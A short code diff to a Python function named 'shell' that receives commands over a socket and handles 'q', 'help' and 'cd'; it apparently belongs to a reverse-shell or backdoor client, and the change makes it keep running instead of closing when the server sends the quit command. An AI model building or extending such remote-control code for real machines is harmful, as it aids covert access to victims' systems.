@@ -101,8 +101,8 @@ def shell(_s):
         if cmd == 'q':
             # print('[-] Instruction to close sent from the server')
             # print(colored('[-] Instruction to close sent from the server', 'red'))
-            _s.close()
-            sys.exit(0)
+            # _s.close()
+            continue
         elif cmd[:5] == 'help':
             reliable_send(_s, get_help())
         elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
